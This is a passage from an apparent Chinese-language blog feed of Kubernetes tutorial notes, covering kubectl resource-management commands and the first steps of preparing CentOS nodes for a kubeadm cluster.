class="string">Beijing</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数组</span></span><br><span class="line"><span class="comment"># 形式一(推荐):</span></span><br><span class="line"><span class="attribute">address</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">顺义</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">昌平  </span></span><br><span class="line"><span class="comment"># 形式二(了解):</span></span><br><span class="line"><span class="attribute">address</span><span class="punctuation">:</span> <span class="string">[顺义,昌平]</span></span><br></pre></td></tr></table></figure><blockquote><p>小提示：</p><p>1 书写yaml切记<code>:</code> 后面要加一个空格</p><p>2 如果需要将多段yaml配置放在一个文件中，中间要使用<code>---</code>分隔</p><p>3 下面是一个yaml转json的网站，可以通过它验证yaml是否书写正确</p><p><a target="_blank" rel="noopener" href="https://www.json2yaml.com/convert-yaml-to-json">https://www.json2yaml.com/convert-yaml-to-json</a></p></blockquote><h2 id="3-3-资源管理方式"><a href="#3-3-资源管理方式" class="headerlink" title="3.3 资源管理方式"></a>3.3 资源管理方式</h2><ul><li><p>命令式对象管理：直接使用命令去操作kubernetes资源</p><p><code>kubectl run nginx-pod --image=nginx:1.17.1 --port=80</code></p></li><li><p>命令式对象配置：通过命令配置和配置文件去操作kubernetes资源</p><p><code>kubectl create/patch -f nginx-pod.yaml</code></p></li><li><p>声明式对象配置：通过apply命令和配置文件去操作kubernetes资源</p><p><code>kubectl apply -f nginx-pod.yaml</code></p></li></ul><table><thead><tr><th align="left">类型</th><th align="left">操作对象</th><th align="left">适用环境</th><th align="left">优点</th><th align="left">缺点</th></tr></thead><tbody><tr><td align="left">命令式对象管理</td><td align="left">对象</td><td align="left">测试</td><td align="left">简单</td><td align="left">只能操作活动对象，无法审计、跟踪</td></tr><tr><td align="left">命令式对象配置</td><td align="left">文件</td><td align="left">开发</td><td align="left">可以审计、跟踪</td><td align="left">项目大时，配置文件多，操作麻烦</td></tr><tr><td align="left">声明式对象配置</td><td align="left">目录</td><td align="left">开发</td><td align="left">支持目录操作</td><td align="left">意外情况下难以调试</td></tr></tbody></table><h3 id="3-3-1-命令式对象管理"><a href="#3-3-1-命令式对象管理" class="headerlink" title="3.3.1 命令式对象管理"></a>3.3.1 命令式对象管理</h3><p><strong>kubectl命令</strong></p><p>kubectl是kubernetes集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl命令的语法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="selector-attr">[command]</span> <span class="selector-attr">[type]</span> <span class="selector-attr">[name]</span> <span class="selector-attr">[flags]</span></span><br></pre></td></tr></table></figure><p><strong>comand</strong>：指定要对资源执行的操作，例如create、get、delete</p><p><strong>type</strong>：指定资源类型，比如deployment、pod、service</p><p><strong>name</strong>：指定资源的名称，名称大小写敏感</p><p><strong>flags</strong>：指定额外的可选参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有pod</span></span><br><span class="line">kubectl get pod </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某个pod</span></span><br><span class="line">kubectl get pod pod_name</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看某个pod,以yaml格式展示结果</span></span><br><span class="line">kubectl get pod pod_name -o yaml</span><br></pre></td></tr></table></figure><p><strong>资源类型</strong></p><p>kubernetes中所有的内容都抽象为资源，可以通过下面的命令进行查看:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">kubectl api-resources</span></span><br></pre></td></tr></table></figure><p>经常使用的资源有下面这些：</p><table><thead><tr><th align="left">资源分类</th><th align="left">资源名称</th><th align="left">缩写</th><th align="left">资源作用</th></tr></thead><tbody><tr><td align="left">集群级别资源</td><td align="left">nodes</td><td align="left">no</td><td align="left">集群组成部分</td></tr><tr><td align="left">namespaces</td><td align="left">ns</td><td align="left">隔离Pod</td><td align="left"></td></tr><tr><td align="left">pod资源</td><td align="left">pods</td><td align="left">po</td><td align="left">装载容器</td></tr><tr><td align="left">pod资源控制器</td><td align="left">replicationcontrollers</td><td align="left">rc</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">replicasets</td><td align="left">rs</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">deployments</td><td align="left">deploy</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">daemonsets</td><td align="left">ds</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">jobs</td><td align="left"></td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">cronjobs</td><td align="left">cj</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">horizontalpodautoscalers</td><td align="left">hpa</td><td align="left">控制pod资源</td></tr><tr><td align="left"></td><td align="left">statefulsets</td><td align="left">sts</td><td align="left">控制pod资源</td></tr><tr><td align="left">服务发现资源</td><td align="left">services</td><td align="left">svc</td><td align="left">统一pod对外接口</td></tr><tr><td align="left"></td><td align="left">ingress</td><td align="left">ing</td><td align="left">统一pod对外接口</td></tr><tr><td align="left">存储资源</td><td align="left">volumeattachments</td><td align="left"></td><td align="left">存储</td></tr><tr><td align="left"></td><td align="left">persistentvolumes</td><td align="left">pv</td><td align="left">存储</td></tr><tr><td align="left"></td><td align="left">persistentvolumeclaims</td><td align="left">pvc</td><td align="left">存储</td></tr><tr><td align="left">配置资源</td><td align="left">configmaps</td><td align="left">cm</td><td align="left">配置</td></tr><tr><td align="left"></td><td align="left">secrets</td><td align="left"></td><td align="left">配置</td></tr></tbody></table><p><strong>操作</strong></p><p>kubernetes允许对资源进行多种操作，可以通过–help查看详细的操作命令</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="comment">--help</span></span><br></pre></td></tr></table></figure><p>经常使用的操作有下面这些：</p><table><thead><tr><th align="left">命令分类</th><th align="left">命令</th><th align="left">翻译</th><th align="left">命令作用</th></tr></thead><tbody><tr><td align="left">基本命令</td><td align="left">create</td><td align="left">创建</td><td align="left">创建一个资源</td></tr><tr><td align="left"></td><td align="left">edit</td><td align="left">编辑</td><td align="left">编辑一个资源</td></tr><tr><td align="left"></td><td align="left">get</td><td align="left">获取</td><td align="left">获取一个资源</td></tr><tr><td align="left"></td><td align="left">patch</td><td align="left">更新</td><td align="left">更新一个资源</td></tr><tr><td align="left"></td><td align="left">delete</td><td align="left">删除</td><td align="left">删除一个资源</td></tr><tr><td align="left"></td><td align="left">explain</td><td align="left">解释</td><td align="left">展示资源文档</td></tr><tr><td align="left">运行和调试</td><td align="left">run</td><td align="left">运行</td><td align="left">在集群中运行一个指定的镜像</td></tr><tr><td align="left"></td><td align="left">expose</td><td align="left">暴露</td><td align="left">暴露资源为Service</td></tr><tr><td align="left"></td><td align="left">describe</td><td align="left">描述</td><td align="left">显示资源内部信息</td></tr><tr><td align="left"></td><td align="left">logs</td><td align="left">日志输出容器在 pod 中的日志</td><td align="left">输出容器在 pod 中的日志</td></tr><tr><td align="left"></td><td align="left">attach</td><td align="left">缠绕进入运行中的容器</td><td align="left">进入运行中的容器</td></tr><tr><td align="left"></td><td align="left">exec</td><td align="left">执行容器中的一个命令</td><td align="left">执行容器中的一个命令</td></tr><tr><td align="left"></td><td align="left">cp</td><td align="left">复制</td><td align="left">在Pod内外复制文件</td></tr><tr><td align="left"></td><td align="left">rollout</td><td align="left">首次展示</td><td align="left">管理资源的发布</td></tr><tr><td align="left"></td><td align="left">scale</td><td align="left">规模</td><td align="left">扩(缩)容Pod的数量</td></tr><tr><td align="left"></td><td align="left">autoscale</td><td align="left">自动调整</td><td align="left">自动调整Pod的数量</td></tr><tr><td align="left">高级命令</td><td align="left">apply</td><td align="left">rc</td><td align="left">通过文件对资源进行配置</td></tr><tr><td align="left"></td><td align="left">label</td><td align="left">标签</td><td align="left">更新资源上的标签</td></tr><tr><td align="left">其他命令</td><td align="left">cluster-info</td><td align="left">集群信息</td><td align="left">显示集群信息</td></tr><tr><td align="left"></td><td align="left">version</td><td align="left">版本</td><td align="left">显示当前Server和Client的版本</td></tr></tbody></table><p>下面以一个namespace &#x2F; pod的创建和删除简单演示下命令的使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个namespace</span></span><br><span class="line">[root@master ~]# kubectl create namespace dev</span><br><span class="line">namespace/dev created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取namespace</span></span><br><span class="line">[root@master ~]# kubectl get ns</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   21h</span><br><span class="line">dev               Active   21s</span><br><span class="line">kube-node-lease   Active   21h</span><br><span class="line">kube-public       Active   21h</span><br><span class="line">kube-system       Active   21h</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在此namespace下创建并运行一个nginx的Pod</span></span><br><span class="line">[root@master ~]# kubectl run pod --image=nginx:latest -n dev</span><br><span class="line">kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.</span><br><span class="line">deployment.apps/pod created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看新创建的pod</span></span><br><span class="line">[root@master ~]# kubectl get pod -n dev</span><br><span class="line">NAME  READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod   1/1     Running   0          21s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除指定的pod</span></span><br><span class="line">[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x</span><br><span class="line">pod &quot;pod&quot; deleted</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除指定的namespace</span></span><br><span class="line">[root@master ~]# kubectl delete ns dev</span><br><span class="line">namespace &quot;dev&quot; deleted</span><br></pre></td></tr></table></figure><h3 id="3-3-2-命令式对象配置"><a href="#3-3-2-命令式对象配置" class="headerlink" title="3.3.2 命令式对象配置"></a>3.3.2 命令式对象配置</h3><p>命令式对象配置就是使用命令配合配置文件一起来操作kubernetes资源。</p><p>1） 创建一个nginxpod.yaml，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginxpod</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-containers</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br></pre></td></tr></table></figure><p>2）执行create命令，创建资源：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">root@master</span> <span class="string">~</span>]<span class="comment"># kubectl create -f nginxpod.yaml</span></span><br><span class="line"><span class="string">namespace/dev</span> <span class="string">created</span></span><br><span class="line"><span class="string">pod/nginxpod</span> <span class="string">created</span></span><br></pre></td></tr></table></figure><p>此时发现创建了两个资源对象，分别是namespace和pod</p><p>3）执行get命令，查看资源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]#  kubectl get -f nginxpod.yaml</span><br><span class="line">NAME            STATUS   AGE</span><br><span class="line">namespace/dev   Active   18s</span><br><span class="line"></span><br><span class="line">NAME            READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/nginxpod    1/1     Running   0          17s</span><br></pre></td></tr></table></figure><p>这样就显示了两个资源对象的信息</p><p>4）执行delete命令，删除资源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# kubectl delete -f nginxpod.yaml</span><br><span class="line">namespace &quot;dev&quot; deleted</span><br><span class="line">pod &quot;nginxpod&quot; deleted</span><br></pre></td></tr></table></figure><p>此时发现两个资源对象被删除了</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">总结:</span></span><br><span class="line">    命令式对象配置的方式操作资源，可以简单的认为：命令  +  yaml配置文件（里面是命令需要的各种参数）</span><br></pre></td></tr></table></figure><h3 id="3-3-3-声明式对象配置"><a href="#3-3-3-声明式对象配置" class="headerlink" title="3.3.3 声明式对象配置"></a>3.3.3 声明式对象配置</h3><p>声明式对象配置跟命令式对象配置很相似，但是它只有一个命令apply。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先执行一次kubectl apply -f yaml文件，发现创建了资源</span></span><br><span class="line">[root@master ~]#  kubectl apply -f nginxpod.yaml</span><br><span class="line">namespace/dev created</span><br><span class="line">pod/nginxpod created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次执行一次kubectl apply -f yaml文件，发现说资源没有变动</span></span><br><span class="line">[root@master ~]#  kubectl apply -f nginxpod.yaml</span><br><span class="line">namespace/dev unchanged</span><br><span class="line">pod/nginxpod unchanged</span><br></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">总结:</span><br><span class="line">    其实声明式对象配置就是使用<span class="built_in">apply</span>描述一个资源最终的状态（在yaml中定义状态）</span><br><span class="line">    使用<span class="built_in">apply</span>操作资源：</span><br><span class="line">        如果资源不存在，就创建，相当于 kubectl create</span><br><span class="line">        如果资源已存在，就更新，相当于 kubectl patch</span><br></pre></td></tr></table></figure><blockquote><p>扩展：kubectl可以在node节点上运行吗 ?</p></blockquote><p>kubectl的运行是需要进行配置的，它的配置文件是$HOME&#x2F;.kube，如果想要在node节点运行此命令，需要将master上的.kube文件复制到node节点上，即在master节点上执行下面操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp  -r  HOME/.kube   node1: HOME/</span><br></pre></td></tr></table></figure><blockquote><p>使用推荐: 三种方式应该怎么用 ?</p></blockquote><p>创建&#x2F;更新资源 使用声明式对象配置 kubectl apply -f XXX.yaml</p><p>删除资源 使用命令式对象配置 kubectl delete -f XXX.yaml</p><p>查询资源 使用命令式对象管理 kubectl get(describe) 资源名称</p>]]></content>
      
      
      <categories>
          
          <category> Doc </category>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes笔记 2</title>
      <link href="/2022/07/09/542779142553-q1jun/"/>
      <url>/2022/07/09/542779142553-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="2-kubernetes集群环境搭建"><a href="#2-kubernetes集群环境搭建" class="headerlink" title="2. kubernetes集群环境搭建"></a>2. kubernetes集群环境搭建</h1><h2 id="2-1-前置知识点"><a href="#2-1-前置知识点" class="headerlink" title="2.1 前置知识点"></a>2.1 前置知识点</h2><p>目前生产部署Kubernetes 集群主要有两种方式：</p><p><strong>kubeadm</strong></p><p>Kubeadm 是一个K8s 部署工具，提供kubeadm init 和kubeadm join，用于快速部署Kubernetes 集群。</p><p>官方地址：<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm/">https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm/</a></p><p><strong>二进制包</strong></p><p>从github 下载发行版的二进制包，手动部署每个组件，组成Kubernetes 集群。</p><p>Kubeadm 降低部署门槛，但屏蔽了很多细节，遇到问题很难排查。如果想更容易可控，推荐使用二进制包部署Kubernetes 集群，虽然手动部署麻烦点，期间可以学习很多工作原理，也利于后期维护。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20200404094800622.png" alt="image-20200404094800622"></p><h2 id="2-2-kubeadm-部署方式介绍"><a href="#2-2-kubeadm-部署方式介绍" class="headerlink" title="2.2 kubeadm 部署方式介绍"></a>2.2 kubeadm 部署方式介绍</h2><p>kubeadm 是官方社区推出的一个用于快速部署kubernetes 集群的工具，这个工具能通过两条指令完成一个kubernetes 集群的部署：</p><ul><li>创建一个Master 节点kubeadm init</li><li>将Node 节点加入到当前集群中$ kubeadm join &lt;Master 节点的IP 和端口&gt;</li></ul><h2 id="2-3-安装要求"><a href="#2-3-安装要求" class="headerlink" title="2.3 安装要求"></a>2.3 安装要求</h2><p>在开始之前，部署Kubernetes 集群机器需要满足以下几个条件：</p><ul><li>一台或多台机器，操作系统CentOS7.x-86_x64</li><li>硬件配置：2GB 或更多RAM，2 个CPU 或更多CPU，硬盘30GB 或更多</li><li>集群中所有机器之间网络互通</li><li>可以访问外网，需要拉取镜像</li><li>禁止swap 分区</li></ul><h2 id="2-4-最终目标"><a href="#2-4-最终目标" class="headerlink" title="2.4 最终目标"></a>2.4 最终目标</h2><ul><li>在所有节点上安装Docker 和kubeadm</li><li>部署Kubernetes Master</li><li>部署容器网络插件</li><li>部署Kubernetes Node，将节点加入Kubernetes 集群中</li><li>部署Dashboard Web 页面，可视化查看Kubernetes 资源</li></ul><h2 id="2-5-准备环境"><a href="#2-5-准备环境" class="headerlink" title="2.5 准备环境"></a>2.5 准备环境</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20210609000002940.png" alt="image-20210609000002940"></p><table><thead><tr><th align="left">角色</th><th align="left">IP地址</th><th align="left">组件</th></tr></thead><tbody><tr><td align="left">k8s-master01</td><td align="left">192.168.5.3</td><td align="left">docker，kubectl，kubeadm，kubelet</td></tr><tr><td align="left">k8s-node01</td><td align="left">192.168.5.4</td><td align="left">docker，kubectl，kubeadm，kubelet</td></tr><tr><td align="left">k8s-node02</td><td align="left">192.168.5.5</td><td align="left">docker，kubectl，kubeadm，kubelet</td></tr></tbody></table><h2 id="2-6-系统初始化"><a href="#2-6-系统初始化" class="headerlink" title="2.6 系统初始化"></a>2.6 系统初始化</h2><h3 id="2-6-1-设置系统主机名以及-Host-文件的相互解析"><a href="#2-6-1-设置系统主机名以及-Host-文件的相互解析" class="headerlink" title="2.6.1 设置系统主机名以及 Host 文件的相互解析"></a>2.6.1 设置系统主机名以及 Host 文件的相互解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl set-hostname k8s-master01 &amp;&amp; bash</span><br><span class="line">hostnamectl set-hostname k8s-node01 &amp;&amp; bash</span><br><span class="line">hostnamectl set-hostname k8s-node02 &amp;&amp; bash</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt;&gt; /etc/hosts</span><br><span class="line">192.168.5.3     k8s-master01</span><br><span class="line">192.168.5.4     k8s-node01</span><br><span class="line">192.168.5.5     k8s-node02</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp /etc/hosts root@192.168.5.4:/etc/hosts </span><br><span class="line">scp /etc/hosts root@192.168.5.5:/etc/hosts </span><br></pre></td></tr></table></figure><h3 id="2-6-2-安装依赖文件（所有节点都要操作）"><a href="#2-6-2-安装依赖文件（所有节点都要操作）" class="headerlink" title="2.6.2 安装依赖文件（所有节点都要操作）"></a>2.6.2 安装依赖文件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget vim net-tools git</span><br></pre></td></tr></table></figure><h3 id="2-6-3-设置防火墙为-Iptables-并设置空规则（所有节点都要操作）"><a href="#2-6-3-设置防火墙为-Iptables-并设置空规则（所有节点都要操作）" class="headerlink" title="2.6.3 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）"></a>2.6.3 设置防火墙为 Iptables 并设置空规则（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"></span><br><span class="line">yum -y install iptables-services &amp;&amp; systemctl start iptables &amp;&amp; systemctl enable iptables &amp;&amp; iptables -F &amp;&amp; service iptables save</span><br></pre></td></tr></table></figure><h3 id="2-6-4-关闭-SELINUX（所有节点都要操作）"><a href="#2-6-4-关闭-SELINUX（所有节点都要操作）" class="headerlink" title="2.6.4 关闭 SELINUX（所有节点都要操作）"></a>2.6.4 关闭 SELINUX（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">swapoff -a &amp;&amp; sed -i &#x27;/ swap / s/^\(.*\)$/#\1/g&#x27; /etc/fstab</span><br><span class="line"></span><br><span class="line">setenforce 0 &amp;&amp; sed -i &#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27; /etc/selinux/config</span><br></pre></td></tr></table></figure><h3 id="2-6-5-调整内核参数，对于-K8S（所有节点都要操作）"><a href="#2-6-5-调整内核参数，对于-K8S（所有节点都要操作）" class="headerlink" title="2.6.5 调整内核参数，对于 K8S（所有节点都要操作）"></a>2.6.5 调整内核参数，对于 K8S（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF&gt; kubernetes.conf </span><br><span class="line">net.bridge.bridge-nf-call-iptables=1</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables=1</span><br><span class="line">net.ipv4.ip_forward=1</span><br><span class="line">net.ipv4.tcp_tw_recycle=0</span><br><span class="line">vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它</span><br><span class="line">vm.overcommit_memory=1 # 不检查物理内存是否够用</span><br><span class="line">vm.panic_on_oom=0 # 开启 OOM</span><br><span class="line">fs.inotify.max_user_instances=8192</span><br><span class="line">fs.inotify.max_user_watches=1048576</span><br><span class="line">fs.file-max=52706963</span><br><span class="line">fs.nr_open=52706963</span><br><span class="line">net.ipv6.conf.all.disable_ipv6=1</span><br><span class="line">net.netfilter.nf_conntrack_max=2310720</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cp kubernetes.conf /etc/sysctl.d/kubernetes.conf</span><br><span class="line"></span><br><span class="line">sysctl -p /etc/sysctl.d/kubernetes.conf</span><br></pre></td></tr></table></figure><h3 id="2-6-6-调整系统时区（所有节点都要操作）"><a href="#2-6-6-调整系统时区（所有节点都要操作）" class="headerlink" title="2.6.6 调整系统时区（所有节点都要操作）"></a>2.6.6 调整系统时区（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置系统时区为 中国/上海</span></span><br><span class="line">timedatectl set-timezone Asia/Shanghai</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将当前的 UTC 时间写入硬件时钟</span></span><br><span class="line">timedatectl set-local-rtc 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启依赖于系统时间的服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure><h3 id="2-6-7-设置-rsyslogd-和-systemd-journald（所有节点都要操作）"><a href="#2-6-7-设置-rsyslogd-和-systemd-journald（所有节点都要操作）" class="headerlink" title="2.6.7 设置 rsyslogd 和 systemd journald（所有节点都要操作）"></a>2.6.7 设置 rsyslogd 和 systemd journald（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">持久化保存日志的目录</span></span><br><span class="line">mkdir /var/log/journal </span><br><span class="line">mkdir /etc/systemd/journald.conf.d</span><br><span class="line">cat &gt; /etc/systemd/journald.conf.d/99-prophet.conf &lt;&lt;EOF</span><br><span class="line">[Journal]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">持久化保存到磁盘</span></span><br><span class="line">Storage=persistent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩历史日志</span></span><br><span class="line">Compress=yes</span><br><span class="line"></span><br><span class="line">SyncIntervalSec=5m</span><br><span class="line">RateLimitInterval=30s</span><br><span class="line">RateLimitBurst=1000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最大占用空间 10G</span></span><br><span class="line">SystemMaxUse=10G</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单日志文件最大 200M</span></span><br><span class="line">SystemMaxFileSize=200M</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志保存时间 2 周</span></span><br><span 